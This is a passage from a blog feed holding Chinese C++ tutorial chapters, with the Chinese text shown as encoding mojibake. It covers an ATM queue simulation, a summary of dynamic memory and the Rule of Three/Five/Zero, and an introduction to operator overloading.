å¹³å‡æ¯å°æ—¶å®¢æˆ·æ•°</span></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; perhour;</span><br><span class="line">    <span class="keyword">double</span> min_per_cust; <span class="comment">// å¹³å‡å¤šå°‘åˆ†é’Ÿæ¥ä¸€ä½å®¢æˆ·</span></span><br><span class="line">    min_per_cust = MIN_PER_HR / perhour;</span><br><span class="line"></span><br><span class="line">    Item temp;          <span class="comment">// ç”¨äºå­˜å‚¨æ–°å®¢æˆ·</span></span><br><span class="line">    <span class="keyword">long</span> turnaways = <span class="number">0</span>; <span class="comment">// å› é˜Ÿåˆ—æ»¡è€Œè¢«æ‹’ç»çš„å®¢æˆ·æ•°</span></span><br><span class="line">    <span class="keyword">long</span> customers = <span class="number">0</span>; <span class="comment">// åŠ å…¥é˜Ÿåˆ—çš„æ€»å®¢æˆ·æ•°</span></span><br><span class="line">    <span class="keyword">long</span> served = <span class="number">0</span>;    <span class="comment">// å®ŒæˆæœåŠ¡çš„æ€»å®¢æˆ·æ•°</span></span><br><span class="line">    <span class="keyword">long</span> sum_line = <span class="number">0</span>;  <span class="comment">// ç´¯è®¡çš„é˜Ÿåˆ—é•¿åº¦ (ç”¨äºè®¡ç®—å¹³å‡é•¿åº¦)</span></span><br><span class="line">    <span class="keyword">int</span> wait_time = <span class="number">0</span>;  <span class="comment">// å½“å‰å®¢æˆ·åœ¨ ATM å¤„è¿˜éœ€ç­‰å¾…çš„æ—¶é—´</span></span><br><span class="line">    <span class="keyword">long</span> line_wait = <span class="number">0</span>; <span class="comment">// æ‰€æœ‰å®¢æˆ·ç´¯è®¡çš„æ€»ç­‰å¾…æ—¶é—´ (é˜Ÿåˆ—ä¸­ + ATMå¤„)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- æ¨¡æ‹Ÿä¸»å¾ªç¯ ---</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">long</span> cycle = <span class="number">0</span>; cycle &lt; cyclelimit; cycle++) &#123;</span><br><span class="line">        <span class="comment">// 1. æ˜¯å¦æœ‰æ–°å®¢æˆ·åˆ°æ¥ï¼Ÿ</span></span><br><span class="line">        <span class="keyword">if</span> (newcustomer(min_per_cust)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (line.isfull()) &#123;</span><br><span class="line">                turnaways++; <span class="comment">// é˜Ÿåˆ—æ»¡ï¼Œæ‹’ç»</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                customers++; <span class="comment">// å®¢æˆ·åŠ å…¥</span></span><br><span class="line">                temp.<span class="built_in">set</span>(cycle); <span class="comment">// è®¾ç½®å®¢æˆ·åˆ°è¾¾æ—¶é—´ (å½“å‰åˆ†é’Ÿæ•°) å’Œéšæœºå¤„ç†æ—¶é—´</span></span><br><span class="line">                line.enqueue(temp); <span class="comment">// åŠ å…¥é˜Ÿåˆ—</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. ATM æ˜¯å¦ç©ºé—²ï¼Ÿå¦‚æœç©ºé—²ä¸”é˜Ÿåˆ—æœ‰äººï¼Œåˆ™æœåŠ¡ä¸‹ä¸€ä½</span></span><br><span class="line">        <span class="keyword">if</span> (wait_time &lt;= <span class="number">0</span> &amp;&amp; !line.isempty()) &#123;</span><br><span class="line">            line.dequeue(temp); <span class="comment">// ä»é˜Ÿåˆ—å–å‡ºå®¢æˆ·</span></span><br><span class="line">            wait_time = temp.ptime(); <span class="comment">// è®¾ç½® ATM éœ€ç­‰å¾…æ—¶é—´ = å®¢æˆ·å¤„ç†æ—¶é—´</span></span><br><span class="line">            line_wait += cycle - temp.when(); <span class="comment">// ç´¯åŠ å®¢æˆ·ç­‰å¾…æ—¶é—´ (å½“å‰æ—¶é—´ - åˆ°è¾¾æ—¶é—´)</span></span><br><span class="line">            served++; <span class="comment">// æœåŠ¡å®¢æˆ·æ•°å¢åŠ </span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. å¦‚æœ ATM æ­£åœ¨æœåŠ¡ï¼Œåˆ™å‡å°‘å‰©ä½™ç­‰å¾…æ—¶é—´</span></span><br><span class="line">        <span class="keyword">if</span> (wait_time &gt; <span class="number">0</span>)</span><br><span class="line">            wait_time--;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. ç´¯åŠ å½“å‰é˜Ÿåˆ—é•¿åº¦</span></span><br><span class="line">        sum_line += line.queuecount();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// --- æ¨¡æ‹Ÿå¾ªç¯ç»“æŸ ---</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- è¾“å‡ºæ¨¡æ‹Ÿç»“æœ ---</span></span><br><span class="line">    <span class="keyword">if</span> (customers &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nCustomers accepted: &quot;</span> &lt;&lt; customers &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Customers served: &quot;</span> &lt;&lt; served &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;         Turnaways: &quot;</span> &lt;&lt; turnaways &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Average queue size: &quot;</span>;</span><br><span class="line">        <span class="built_in">cout</span>.precision(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">cout</span>.setf(ios_base::fixed, ios_base::floatfield);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; (<span class="keyword">double</span>) sum_line / cyclelimit &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// å¹³å‡é˜Ÿåˆ—é•¿åº¦</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Average wait time: &quot;</span></span><br><span class="line">             &lt;&lt; (<span class="keyword">double</span>) line_wait / served &lt;&lt; <span class="string">&quot; minutes\n&quot;</span>; <span class="comment">// å¹³å‡ç­‰å¾…æ—¶é—´</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No customers!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Done!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰ï¼šåˆ¤æ–­æ˜¯å¦æœ‰æ–°å®¢æˆ·åˆ°æ¥</span></span><br><span class="line"><span class="comment">// è¿™æ˜¯ä¸€ä¸ªç®€å•çš„æ¦‚ç‡æ¨¡å‹ï¼šåœ¨ä¸€åˆ†é’Ÿå†…ï¼Œå®¢æˆ·åˆ°æ¥çš„æ¦‚ç‡æ˜¯ 1/x</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">newcustomer</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// rand() * x / RAND_MAX &lt; 1  ç­‰ä»·äº rand() / RAND_MAX &lt; 1/x</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">std</span>::rand() * x / RAND_MAX &lt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘å’Œè¿è¡Œ:</strong></p><p>ä½ éœ€è¦å°† <code>queue.cpp</code> å’Œ <code>atm.cpp</code> ä¸€èµ·ç¼–è¯‘é“¾æ¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ atm.cpp queue.cpp -o atm</span><br><span class="line">./atm</span><br></pre></td></tr></table></figure><p>ç¨‹åºä¼šæç¤ºä½ è¾“å…¥é˜Ÿåˆ—æœ€å¤§é•¿åº¦ã€æ¨¡æ‹Ÿå°æ—¶æ•°å’Œå¹³å‡æ¯å°æ—¶å®¢æˆ·æ•°ï¼Œç„¶åè¿è¡Œæ¨¡æ‹Ÿå¹¶è¾“å‡ºç»“æœã€‚ä½ å¯ä»¥å°è¯•ä¸åŒçš„è¾“å…¥å€¼ï¼Œè§‚å¯Ÿå®ƒä»¬å¯¹å¹³å‡ç­‰å¾…æ—¶é—´å’Œé˜Ÿåˆ—é•¿åº¦çš„å½±å“ã€‚è¿™ä¸ªæ¨¡æ‹Ÿè™½ç„¶ç®€å•ï¼Œä½†å®ƒå±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ç±»ï¼ˆç‰¹åˆ«æ˜¯æ¶‰åŠåŠ¨æ€å†…å­˜çš„ç±»ï¼‰æ¥è§£å†³å®é™…é—®é¢˜ã€‚</p><h2 id="12-8-æ€»ç»“"><a href="#12-8-æ€»ç»“" class="headerlink" title="12.8 æ€»ç»“"></a>12.8 æ€»ç»“</h2><p>æœ¬ç« æ·±å…¥æ¢è®¨äº†å½“ C++ ç±»éœ€è¦ç›´æ¥ç®¡ç†åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼ˆä½¿ç”¨ <code>new</code> å’Œ <code>delete</code>ï¼‰æ—¶æ‰€é¢ä¸´çš„æŒ‘æˆ˜å’Œå¿…éœ€çš„æŠ€æœ¯ã€‚æ ¸å¿ƒé—®é¢˜åœ¨äºç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„é»˜è®¤æˆå‘˜å‡½æ•°ï¼ˆç‰¹åˆ«æ˜¯å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ï¼‰æ‰§è¡Œçš„æµ…å¤åˆ¶è¡Œä¸ºï¼Œè¿™å¯¹äºåŒ…å«åŸå§‹æŒ‡é’ˆæˆå‘˜çš„ç±»æ¥è¯´æ˜¯å±é™©çš„ã€‚</p><p>ä¸»è¦å†…å®¹å›é¡¾ï¼š</p><ol><li><p><strong>åŠ¨æ€å†…å­˜å’Œç±»çš„é—®é¢˜:</strong></p><ul><li>  å¦‚æœç±»ä½¿ç”¨ <code>new</code> åˆ†é…å†…å­˜å¹¶å­˜å‚¨åœ¨æŒ‡é’ˆæˆå‘˜ä¸­ï¼Œé»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦åªä¼šå¤åˆ¶æŒ‡é’ˆçš„åœ°å€ï¼ˆ<strong>æµ…å¤åˆ¶</strong>ï¼‰ï¼Œè€Œä¸æ˜¯æŒ‡é’ˆæŒ‡å‘çš„æ•°æ®ã€‚</li><li>  æµ…å¤åˆ¶å¯¼è‡´å¤šä¸ªå¯¹è±¡å…±äº«åŒä¸€å—åŠ¨æ€å†…å­˜ï¼Œå½“å…¶ä¸­ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯å¹¶è°ƒç”¨ææ„å‡½æ•° <code>delete</code> å†…å­˜æ—¶ï¼Œå…¶ä»–å¯¹è±¡çš„æŒ‡é’ˆå°±å˜æˆäº†<strong>æ‚¬æŒ‚æŒ‡é’ˆ</strong>ã€‚</li><li>  åç»­å¯¹æ‚¬æŒ‚æŒ‡é’ˆçš„è®¿é—®æˆ–åœ¨å…¶ä»–å¯¹è±¡ææ„æ—¶å†æ¬¡ <code>delete</code> åŒä¸€å—å†…å­˜ï¼ˆ<strong>é‡å¤åˆ é™¤</strong>ï¼‰ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºå’Œç¨‹åºå´©æºƒã€‚</li><li>  é»˜è®¤èµ‹å€¼è¿ç®—ç¬¦è¿˜å¯èƒ½å¯¼è‡´<strong>å†…å­˜æ³„æ¼</strong>ï¼Œå› ä¸ºå®ƒè¦†ç›–äº†æ—§æŒ‡é’ˆè€Œæ²¡æœ‰é‡Šæ”¾å…¶æŒ‡å‘çš„å†…å­˜ã€‚</li></ul></li><li><p><strong>ç‰¹æ®Šæˆå‘˜å‡½æ•°å’Œå¤åˆ¶æ§åˆ¶ (Rule of Three/Five):</strong></p><ul><li>ä¸ºäº†è§£å†³æµ…å¤åˆ¶é—®é¢˜ï¼Œç®¡ç†åŠ¨æ€å†…å­˜çš„ç±»é€šå¸¸éœ€è¦æä¾›è‡ªå®šä¹‰çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼š<ul><li>  <strong>ææ„å‡½æ•° (<code>~ClassName()</code>):</strong> å¿…é¡»å®šä¹‰ï¼Œè´Ÿè´£ä½¿ç”¨ <code>delete</code> æˆ– <code>delete[]</code> é‡Šæ”¾ç”±æ„é€ å‡½æ•°åˆ†é…çš„æ‰€æœ‰åŠ¨æ€å†…å­˜ã€‚</li><li>  <strong>å¤åˆ¶æ„é€ å‡½æ•° (<code>ClassName(const ClassName &amp;)</code>):</strong> å¿…é¡»å®šä¹‰ï¼Œæ‰§è¡Œ<strong>æ·±å¤åˆ¶</strong>â€”â€”ä¸ºæ–°å¯¹è±¡åˆ†é…ç‹¬ç«‹çš„å†…å­˜ï¼Œå¹¶å°†æºå¯¹è±¡çš„æ•°æ®å¤åˆ¶åˆ°æ–°å†…å­˜ä¸­ã€‚</li><li>  <strong>å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ (<code>ClassName &amp; operator=(const ClassName &amp;)</code>):</strong> å¿…é¡»å®šä¹‰ï¼Œæ‰§è¡Œ<strong>æ·±å¤åˆ¶</strong>ï¼ŒåŒæ—¶éœ€è¦å¤„ç†<strong>è‡ªæˆ‘èµ‹å€¼</strong>ï¼ˆ<code>obj = obj;</code>ï¼‰å¹¶<strong>é‡Šæ”¾æ—§èµ„æº</strong>ï¼Œæœ€åè¿”å› <code>*this</code>ã€‚</li></ul></li><li>  <strong>ä¸‰æ³•åˆ™ (Rule of Three, C++11 å‰):</strong> å¦‚æœä½ éœ€è¦è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°æˆ–å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œä½ å‡ ä¹è‚¯å®šéœ€è¦å…¨éƒ¨ä¸‰ä¸ªã€‚</li><li>  <strong>äº”æ³•åˆ™ (Rule of Five, C++11 åŠä»¥å):</strong> éšç€ç§»åŠ¨è¯­ä¹‰çš„å¼•å…¥ï¼Œå¦‚æœéœ€è¦è‡ªå®šä¹‰ä¸Šè¿°ä¸‰ä¸ªæˆ–ç§»åŠ¨æ„é€ å‡½æ•°/ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œé€šå¸¸éœ€è¦è€ƒè™‘æ‰€æœ‰äº”ä¸ªã€‚</li></ul></li><li><p> <strong>æ”¹è¿›çš„ <code>String</code> ç±»:</strong> é€šè¿‡å®ç°è‡ªå®šä¹‰çš„ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ï¼ˆæ‰§è¡Œæ·±å¤åˆ¶ï¼‰ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªèƒ½å¤Ÿå®‰å…¨ç®¡ç†åŠ¨æ€å†…å­˜çš„ <code>String</code> ç±»ã€‚</p></li><li><p><strong>æ„é€ å‡½æ•°ä¸­ä½¿ç”¨ <code>new</code> çš„æ³¨æ„äº‹é¡¹:</strong></p><ul><li>  å¿…é¡»åœ¨ææ„å‡½æ•°ä¸­é…å¯¹ä½¿ç”¨ <code>delete</code> æˆ– <code>delete[]</code>ã€‚</li><li>  <code>new</code> å¯èƒ½å¤±è´¥å¹¶æŠ›å‡º <code>std::bad_alloc</code> å¼‚å¸¸ã€‚å¦‚æœæ„é€ å‡½æ•°åœ¨ <code>new</code> å¤±è´¥å‰å·²åˆ†é…å…¶ä»–èµ„æºï¼Œéœ€è¦æ³¨æ„èµ„æºæ³„æ¼é—®é¢˜ï¼ˆææ„å‡½æ•°ä¸ä¼šè¢«è°ƒç”¨ï¼‰ã€‚ä½¿ç”¨ RAIIï¼ˆå¦‚æ™ºèƒ½æŒ‡é’ˆï¼‰æ˜¯æ›´å®‰å…¨çš„åšæ³•ã€‚</li><li>  å¦‚æœç±»çš„æˆå‘˜æ˜¯å…¶ä»–ç±»çš„å¯¹è±¡ï¼Œé»˜è®¤çš„å¤åˆ¶/èµ‹å€¼æ“ä½œä¼šè°ƒç”¨æˆå‘˜å¯¹è±¡çš„ç›¸åº”å¤åˆ¶/èµ‹å€¼æ“ä½œã€‚å¦‚æœæˆå‘˜å¯¹è±¡èƒ½æ­£ç¡®å¤„ç†è‡ªå·±çš„èµ„æºï¼Œè¿™é€šå¸¸æ˜¯å®‰å…¨çš„ã€‚</li></ul></li><li><p><strong>è¿”å›å¯¹è±¡:</strong></p><ul><li>  <strong>æŒ‰å¼•ç”¨è¿”å› (<code>&amp;</code> æˆ– <code>const &amp;</code>):</strong> é«˜æ•ˆï¼Œç”¨äºè¿”å›å·²å­˜åœ¨çš„å¯¹è±¡ï¼Œä½†ä¸èƒ½è¿”å›å±€éƒ¨å˜é‡çš„å¼•ç”¨ã€‚</li><li>  <strong>æŒ‰å€¼è¿”å› (<code>ClassName</code>):</strong> å®‰å…¨ï¼Œè¿”å›å‰¯æœ¬æˆ–ç§»åŠ¨åçš„å¯¹è±¡ã€‚ç°ä»£ C++ é€šè¿‡ RVO/NRVO å’Œç§»åŠ¨è¯­ä¹‰ä½¿å…¶é€šå¸¸è¶³å¤Ÿé«˜æ•ˆã€‚</li></ul></li><li><p><strong>æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆ:</strong></p><ul><li>  ä½¿ç”¨ <code>new</code> åŠ¨æ€åˆ›å»ºå¯¹è±¡ï¼Œè¿”å›å¯¹è±¡æŒ‡é’ˆã€‚</li><li>  ä½¿ç”¨ <code>delete</code> é”€æ¯å¯¹è±¡ï¼ˆè°ƒç”¨ææ„å‡½æ•°å¹¶é‡Šæ”¾å†…å­˜ï¼‰ã€‚</li><li>  ä½¿ç”¨ <code>new[]</code> å’Œ <code>delete[]</code> å¤„ç†åŠ¨æ€å¯¹è±¡æ•°ç»„ã€‚</li><li>  ä½¿ç”¨ç®­å¤´è¿ç®—ç¬¦ <code>-&gt;</code> è®¿é—®æŒ‡é’ˆæŒ‡å‘å¯¹è±¡çš„æˆå‘˜ã€‚</li><li>  <strong>å®šä½ <code>new</code> (<code>placement new</code>):</strong> åœ¨é¢„å…ˆåˆ†é…å¥½çš„å†…å­˜åœ°å€ä¸Šæ„é€ å¯¹è±¡ï¼Œéœ€è¦æ˜¾å¼è°ƒç”¨ææ„å‡½æ•° (<code>ptr-&gt;~ClassName()</code>) æ¥é”€æ¯å¯¹è±¡ï¼Œå†…å­˜éœ€å¦å¤–ç®¡ç†ã€‚</li></ul></li><li><p><strong>é™æ€ç±»æˆå‘˜:</strong></p><ul><li>  <strong>é™æ€æ•°æ®æˆå‘˜:</strong> è¢«ç±»çš„æ‰€æœ‰å¯¹è±¡å…±äº«ï¼Œç‹¬ç«‹äºä»»ä½•å¯¹è±¡å­˜åœ¨ï¼Œé€šå¸¸åœ¨ç±»å¤–åˆå§‹åŒ–ã€‚</li><li>  <strong>é™æ€æˆå‘˜å‡½æ•°:</strong> ä¸ä¸ç‰¹å®šå¯¹è±¡å…³è”ï¼ˆæ—  <code>this</code> æŒ‡é’ˆï¼‰ï¼Œåªèƒ½è®¿é—®é™æ€æˆå‘˜ï¼Œå¯é€šè¿‡ç±»åè°ƒç”¨ (<code>ClassName::static_func()</code>)ã€‚</li></ul></li><li><p> <strong>é˜Ÿåˆ—æ¨¡æ‹Ÿ:</strong> æ¼”ç¤ºäº†å¦‚ä½•åº”ç”¨ç±»å’ŒåŠ¨æ€å†…å­˜ç®¡ç†ï¼ˆé“¾è¡¨å®ç°çš„é˜Ÿåˆ—ï¼‰æ¥è§£å†³ä¸€ä¸ªå®é™…çš„æ¨¡æ‹Ÿé—®é¢˜ã€‚</p></li><li><p> <strong>ç°ä»£ C++ å»ºè®® (Rule of Zero):</strong> å°½å¯èƒ½ä½¿ç”¨æ ‡å‡†åº“æä¾›çš„èµ„æºç®¡ç†ç±»ï¼ˆå¦‚ <code>std::string</code>, <code>std::vector</code>, <code>std::unique_ptr</code>, <code>std::shared_ptr</code>ï¼‰ï¼Œå®ƒä»¬éµå¾ª RAII åŸåˆ™å¹¶æ­£ç¡®å®ç°äº†å¤åˆ¶/ç§»åŠ¨è¯­ä¹‰ã€‚å¦‚æœä½ çš„ç±»åªä½¿ç”¨è¿™äº›å·¥å…·æ¥ç®¡ç†èµ„æºï¼Œé€šå¸¸å°±ä¸éœ€è¦ç¼–å†™ä»»ä½•è‡ªå®šä¹‰çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼ˆé›¶æ³•åˆ™ï¼‰ï¼Œä»è€Œä½¿ä»£ç æ›´ç®€å•ã€æ›´å®‰å…¨ã€‚</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 11 ä½¿ç”¨ç±»</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_11/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_11/</url>
      
        <content type="html"><![CDATA[<h2 id="11-1-è¿ç®—ç¬¦é‡è½½"><a href="#11-1-è¿ç®—ç¬¦é‡è½½" class="headerlink" title="11.1 è¿ç®—ç¬¦é‡è½½"></a>11.1 è¿ç®—ç¬¦é‡è½½</h2><p>C++ å…è®¸å°†è¿ç®—ç¬¦ï¼ˆå¦‚ <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>==</code> ç­‰ï¼‰åº”ç”¨äº<strong>ç±»å¯¹è±¡</strong>ï¼Œå°±åƒå®ƒä»¬æ˜¯å†…ç½®ç±»å‹ï¼ˆå¦‚ <code>int</code> æˆ– <code>double</code>ï¼‰ä¸€æ ·ã€‚è¿™ç§ç‰¹æ€§ç§°ä¸º**è¿ç®—ç¬¦é‡è½½ (Operator Overloading)**ã€‚</p><p><strong>ç›®çš„:</strong></p><p>è¿ç®—ç¬¦é‡è½½çš„ä¸»è¦ç›®çš„æ˜¯<strong>æé«˜ä»£ç çš„å¯è¯»æ€§å’Œç›´è§‚æ€§</strong>ã€‚é€šè¿‡é‡è½½è¿ç®—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥è®©æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„ç±»ï¼ˆæ¯”å¦‚è¡¨ç¤ºå¤æ•°ã€å‘é‡ã€æ—¶é—´æˆ–å­—ç¬¦ä¸²çš„ç±»ï¼‰èƒ½å¤Ÿä½¿ç”¨ç†Ÿæ‚‰çš„è¿ç®—ç¬¦è¿›è¡Œæ“ä½œï¼Œä½¿å¾—ä»£ç æ›´æ¥è¿‘è‡ªç„¶è¯­è¨€æˆ–æ•°å­¦è¡¨ç¤ºæ³•ã€‚</p><p>ä¾‹å¦‚ï¼Œå‡è®¾ä½ æœ‰ä¸€ä¸ªè¡¨ç¤ºäºŒç»´å‘é‡çš„ç±» <code>Vector</code>ã€‚å¦‚æœæ²¡æœ‰è¿ç®—ç¬¦é‡è½½ï¼Œä½ å¯èƒ½éœ€è¦è¿™æ ·å†™ä»£ç æ¥è®¡ç®—ä¸¤ä¸ªå‘é‡çš„å’Œï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Vector <span class="title">v1</span><span class="params">(<span class="number">1.0</span>, <span class="number">2.0</span>)</span></span>;</span><br><span class="line"><span class="function">Vector <span class="title">v2</span><span class="params">(<span class="number">3.0</span>, <span class="number">4.0</span>)</span></span>;</span><br><span class="line">Vector sum = v1.add(v2); <span class="comment">// ä½¿ç”¨åä¸º add çš„æˆå‘˜å‡½æ•°</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡é‡è½½ <code>+</code> è¿ç®—ç¬¦ï¼Œä½ å¯ä»¥å†™å‡ºæ›´è‡ªç„¶ã€æ›´ç®€æ´çš„ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Vector <span class="title">v1</span><span class="params">(<span class="number">1.0</span>, <span class="number">2.0</span>)</span></span>;</span><br><span class="line"><span class="function">Vector <span class="title">v2</span><span class="params">(<span class="number">3.0</span>, <span class="number">4.0</span>)</span></span>;</span><br><span class="line">Vector sum = v1 + v2; <span class="comment">// ä½¿ç”¨é‡è½½çš„ + è¿ç®—ç¬¦</span></span><br></pre></td></tr></table></figure><p><strong>å¦‚ä½•å®ç°:</strong></p><p>è¿ç®—ç¬¦é‡è½½æ˜¯é€šè¿‡ç¼–å†™ç‰¹æ®Šçš„<strong>è¿ç®—ç¬¦å‡½æ•° (Operator Functions)</strong> æ¥å®ç°çš„ã€‚è¿ç®—ç¬¦å‡½æ•°çš„åç§°æ ¼å¼ä¸º <code>operator</code> å…³é”®å­—åè·Ÿè¦é‡è½½çš„è¿ç®—ç¬¦ç¬¦å·ã€‚ä¾‹å¦‚ï¼Œé‡è½½åŠ æ³•è¿ç®—ç¬¦ <code>+</code> çš„å‡½æ•°åä¸º <code>operator+</code>ï¼Œé‡è½½å°äºè¿ç®—ç¬¦ <code>&lt;</code> çš„å‡½æ•°åä¸º <code>operator&lt;</code>ã€‚</p><p>è¿ç®—ç¬¦å‡½æ•°å¯ä»¥è¢«å®šä¹‰ä¸ºï¼š</p><ol><li><p><strong>ç±»çš„æˆå‘˜å‡½æ•° (Member Function):</strong></p><ul><li>  å½“è¿ç®—ç¬¦å‡½æ•°æ˜¯æˆå‘˜å‡½æ•°æ—¶ï¼Œå®ƒçš„<strong>ç¬¬ä¸€ä¸ªæ“ä½œæ•°</strong>éšå¼åœ°æ˜¯è°ƒç”¨è¯¥å‡½æ•°çš„å¯¹è±¡ï¼ˆé€šè¿‡ <code>this</code> æŒ‡é’ˆè®¿é—®ï¼‰ã€‚</li><li>  å¯¹äºäºŒå…ƒè¿ç®—ç¬¦ï¼ˆå¦‚ <code>+</code>, <code>-</code>, <code>*</code>ï¼‰ï¼Œæˆå‘˜å‡½æ•°åªéœ€è¦<strong>ä¸€ä¸ªæ˜¾å¼å‚æ•°</strong>ï¼ˆä»£è¡¨å³æ“ä½œæ•°ï¼‰ã€‚</li><li>  å¯¹äºä¸€å…ƒè¿ç®—ç¬¦ï¼ˆå¦‚ <code>-</code> (è´Ÿå·), <code>++</code> (å‰ç¼€)ï¼‰ï¼Œæˆå‘˜å‡½æ•°<strong>æ²¡æœ‰æ˜¾å¼å‚æ•°</strong>ã€‚</li></ul></li><li><p><strong>éæˆå‘˜å‡½æ•° (Non-member Function):</strong></p><ul><li>  é€šå¸¸å°†éæˆå‘˜è¿ç®—ç¬¦å‡½æ•°å£°æ˜ä¸ºç±»çš„**å‹å…ƒ (friend)**ï¼Œä»¥ä¾¿å®ƒå¯ä»¥è®¿é—®ç±»çš„ç§æœ‰æˆå‘˜ã€‚</li><li>  å¯¹äºäºŒå…ƒè¿ç®—ç¬¦ï¼Œéæˆå‘˜å‡½æ•°éœ€è¦<strong>ä¸¤ä¸ªæ˜¾å¼å‚æ•°</strong>ï¼ˆåˆ†åˆ«ä»£è¡¨å·¦æ“ä½œæ•°å’Œå³æ“ä½œæ•°ï¼‰ã€‚</li><li>  å¯¹äºä¸€å…ƒè¿ç®—ç¬¦ï¼Œéæˆå‘˜å‡½æ•°éœ€è¦<strong>ä¸€ä¸ªæ˜¾å¼å‚æ•°</strong>ã€‚</li></ul></li></ol><p><strong>åŸºæœ¬è¯­æ³• (ä»¥äºŒå…ƒè¿ç®—ç¬¦ <code>+</code> ä¸ºä¾‹):</strong></p><p><strong>ä½œä¸ºæˆå‘˜å‡½æ•°:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... å…¶ä»–æˆå‘˜ ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å£°æ˜é‡è½½çš„ + è¿ç®—ç¬¦ (æˆå‘˜å‡½æ•°)</span></span><br><span class="line">    <span class="comment">// other æ˜¯å³æ“ä½œæ•°å¯¹è±¡</span></span><br><span class="line">    MyClass <span class="keyword">operator</span>+(<span class="keyword">const</span> MyClass&amp; other) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰</span></span><br><span class="line">MyClass MyClass::<span class="keyword">operator</span>+(<span class="keyword">const</span> MyClass&amp; other) <span 